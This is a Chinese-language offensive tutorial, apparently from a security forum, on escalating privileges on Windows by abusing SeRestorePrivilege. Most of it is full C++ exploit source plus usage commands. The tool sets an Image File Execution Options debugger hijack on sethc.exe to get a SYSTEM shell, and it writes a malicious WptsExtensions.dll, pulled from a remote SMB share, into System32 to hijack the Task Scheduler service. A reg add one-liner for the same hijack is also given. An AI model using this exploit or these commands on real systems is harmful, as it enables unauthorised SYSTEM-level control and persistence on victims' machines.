SeRestorePrivilege
------------------

### 禁止任何公众号/营销号转发

SeRestorePrivilege 特权在 Microsoft 官方文档中被描述为 “*Restore files and directories*”，拥有该特权的任何进程被授予对系统上任何文件或对象的所有写访问控制，而不管为文件或对象指定的访问控制列表（ACL）。 此外，此特权允许其持有进程或线程更改文件的所有者。

在通过 API 利用此特权时，必须向支持的 API 提供相应的 `_BACKUP_` 标志，例如 `CreateFile()` 函数需要指定 `FILE_FLAG_BACKUP_SEMANTICS` 标志，`RegCreateKeyEx()` 函数需要指定 `REG_OPTION_BACKUP_RESTORE` 标志。这提示内核请求进程可能启用了 SeBackupPrivilege 或 SeRestorePrivilege，并无视 ACL 检查。

利用该特权任意写入 HKLM 注册表能够实现特权提升。例如，我们选择使用 Image File Execution Options 键，用于在系统上调试软件。启动系统二进制文件时，如果在以下注册表位置中存在一个条目并且它包含一个调试器键值，它将执行设置的条目，实现映像劫持。

```powershell
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
```

此外，还可以将 DLL 放入系统文件夹中以进行 DLL 劫持、覆盖关键系统资源或修改其他服务等方式实现特权提升。

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeRestorePrivilege 特权，然后通过上述两种方法滥用该特权。如果执行时 `-e` 参数为 “Dubugger”，则调用 `RegCreateKeyExW()` 函数在 `Image File Execution Options` 注册表下创建一个子项，然后用 `RegSetValueExW()` 函数为指定的程序（默认为 sethc.exe）设置 Debugger 键实现映像劫持（默认将 Debugger 键设为 C:\\Windows\\System32\\cmd.exe）。如果 `-e` 参数为 “File”，则通过 `CreateFileW()` 函数创建文件进行 DLL 劫持、覆盖关键系统资源或修改其他服务等。

- SeRestorePrivilege.cpp

```c++
#include <Windows.h>
#include <iostream>
#include <stdio.h>

#define SIZE 200000

BOOL ExploitSeRestorePrivilege(LPCWSTR expType, LPCWSTR program, LPCWSTR command, LPCWSTR sourceFile, LPCWSTR destFile)
{
    BOOL status = FALSE;
    DWORD lResult;
    HKEY hKey;
    HANDLE hSource, hDestination;
    char buffer[SIZE + 1];
    DWORD dwBytesRead, dwBytesWrite;

    if (!wcscmp(expType, L"Dubugger"))
    {
        // Creates the specified registry key.
        lResult = RegCreateKeyExW(
            HKEY_LOCAL_MACHINE, 
            std::wstring(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\").append(program).c_str(), 
            0, 
            NULL,
            REG_OPTION_BACKUP_RESTORE,
            KEY_SET_VALUE, 
            NULL, 
            &hKey, 
            NULL
        );
        if (lResult != ERROR_SUCCESS)
        {
            wprintf(L"[-] RegCreateKeyExW Error: [%u].\n", lResult);
            return status;
        }
        // Sets the data and type of a specified value under a registry key.
        lResult = RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (const BYTE*)command, (wcslen(command) + 1) * sizeof(WCHAR));
        if (lResult != ERROR_SUCCESS)
        {
            wprintf(L"[-] RegSetValueExW Error: [%u].\n", lResult);
            return status;
        }
        wprintf(L"[*] Set Image File Execution Options for %ws successfully with Debugger as %ws.\n", program, command);
        status = TRUE;
    }
    else if(!wcscmp(expType, L"File"))
    {
        if (sourceFile && destFile)
        {
            // Open source file.
            hSource = CreateFileW(sourceFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hSource == INVALID_HANDLE_VALUE)
            {
                wprintf(L"[-] Could not open source file by CreateFileW: [%u].\n", GetLastError());
                return status;
            }
            // Create destination file.
            hDestination = CreateFileW(destFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_FLAG_BACKUP_SEMANTICS, NULL);
            if (hDestination == INVALID_HANDLE_VALUE)
            {
                wprintf(L"[-] Could not create destination file by CreateFileW: [%u].\n", GetLastError());
                return status;
            }
            // Read from source file.
            if (!ReadFile(hSource, buffer, SIZE, &dwBytesRead, NULL))
            {
                wprintf(L"[-] ReadFile Error: [%u].\n", GetLastError());
                return status;
            }
            wprintf(L"[*] Read bytes from %ws: %d\n", sourceFile, dwBytesRead);
            // Write to destination file.
            if (!WriteFile(hDestination, buffer, dwBytesRead, &dwBytesWrite, NULL))
            {
                wprintf(L"[-] WriteFile Error: [%u].\n", GetLastError());
                return status;
            }
            printf("[*] Bytes written to %ws: %d\n", destFile, dwBytesWrite);
            status = TRUE;
        }
    }
    return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
    BOOL status = FALSE;
    LUID luidValue = { 0 };
    TOKEN_PRIVILEGES tokenPrivileges;

    // Get the LUID value of the privilege for the local system
    if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
    {
        wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
        return status;
    }

    // Set escalation information
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luidValue;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Elevate Process Token Access
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
    {
        wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
        return status;
    }
    else
    {
        status = TRUE;
    }
    return status;
}

void PrintUsage()
{
    wprintf(
        L"Abuse of SeRestorePrivilege by @WHOAMI (whoamianony.top)\n\n"
        L"Arguments:\n"
        L"  -h                     Show this help message and exit\n"
        L"  -e <Dubugger, File>    Choose the type of exploit.\n"
        L"  -p <Program>           Specifies the original program name to IFEO hijacking.\n"
        L"  -c <Program>           Specifies the program to execute after IFEO hijacking.\n"
        L"  -s <Source>            Source file to read.\n"
        L"  -d <Destination>       Destination file to write.\n"
    );
}

int wmain(int argc, wchar_t* argv[])
{
    HANDLE hToken      = NULL;
    LPCWSTR expType    = L"Dubugger";
    LPCWSTR program    = L"sethc.exe";
    LPCWSTR command    = L"\"C:\\Windows\\System32\\cmd.exe\"";
    LPCWSTR sourceFile = NULL;
    LPCWSTR destFile   = NULL;

    while ((argc > 1) && (argv[1][0] == '-'))
    {
        switch (argv[1][1])
        {
        case 'h':
            PrintUsage();
            return 0;
        case 'e':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                expType = (LPCWSTR)argv[1];
            }
            break;
        case 'p':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                program = (LPCWSTR)argv[1];
            }
            break;
        case 'c':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                command = (LPCWSTR)argv[1];
            }
            break;
        case 's':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                sourceFile = (LPCWSTR)argv[1];
            }
            break;
        case 'd':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                destFile = (LPCWSTR)argv[1];
            }
            break;
        default:
            wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
            PrintUsage();
            return 0;
        }

        ++argv;
        --argc;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
        return 0;
    }
    // Enable SeRestorePrivilege for the current process token.
    if (EnableTokenPrivilege(hToken, SE_RESTORE_NAME))
    {
        if (ExploitSeRestorePrivilege(expType, program, command, sourceFile, destFile))
        {
            return 1;
        }
    }
}
```

将编译并生成好的 SeRestorePrivilege.exe 上传到目标主机，执行以下命令，在 `Image File Execution Options` 注册表下创建一个子项 sethc.exe，并将 Debugger 键值设为 C:\\Windows\\System32\\cmd.exe，如下图所示。

```cmd
SeRestorePrivilege.exe -e Dubugger -p sethc.exe -c C:\Windows\System32\cmd.exe
```

![image-20230209113121331](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-dc655d7ea3beae87c68d8a4dfdce58393bcfc469.png)

然后，在目标主机的远程桌面登录屏幕中连按 5 次 Shift 键即可获取一个命令行窗口，并且为 NT AUTHORITY\\SYSTEM 权限，如下图所示。

![image-20230209111912926](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-0953647fcaa3589e08e88efb2cbc5067cdf9097f.png)

当然，我们可以直接通过 `reg` 命令设置映像劫持，如下图所示。这是因为在 `reg` 命令内部会自动调用 `AdjustTokenPrivileges()` 函数为当前进程开启 SeRestorePrivilege 特权。

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
```

此外，如果我们指定 `-e` 为 ”File“，则可以写入任意文件，这里我们在系统目录中写入恶意 DLL 来劫持系统服务。这里劫持的是 Task Scheduler 服务。Task Scheduler 服务使用户可以在此计算机上配置和计划自动任务，并托管多个 Windows 系统关键任务。该服务启动后，将尝试在 C:\\Windows\\System32 目录中加载 WptsExtensions.dll，但是该链接库文件不存在。我们可以制作一个同名的恶意 DLL 并放入远程共享文件夹中，然后通过 SeRestorePrivilege.exe 将恶意 DLL 写入到 C:\\Windows\\System32 目录中，如下图所示。

```cmd
SeRestorePrivilege.exe -e File -s \\172.26.10.128\evilsmb\WptsExtensions.dll -d C:\Windows\System32\WptsExtensions.dll
```

![image-20230209115832079](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-e6b79609f56d5431c1e4d227a6cc8718749cd5c6.png)

当系统或服务重启时，目标系统上线，并且为 NT AUTHORITY\\SYSTEM 权限，如下图所示。

![image-20230209120050530](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-0eef89e527e8d2ae3032dd6ffe399af306baf41c.png)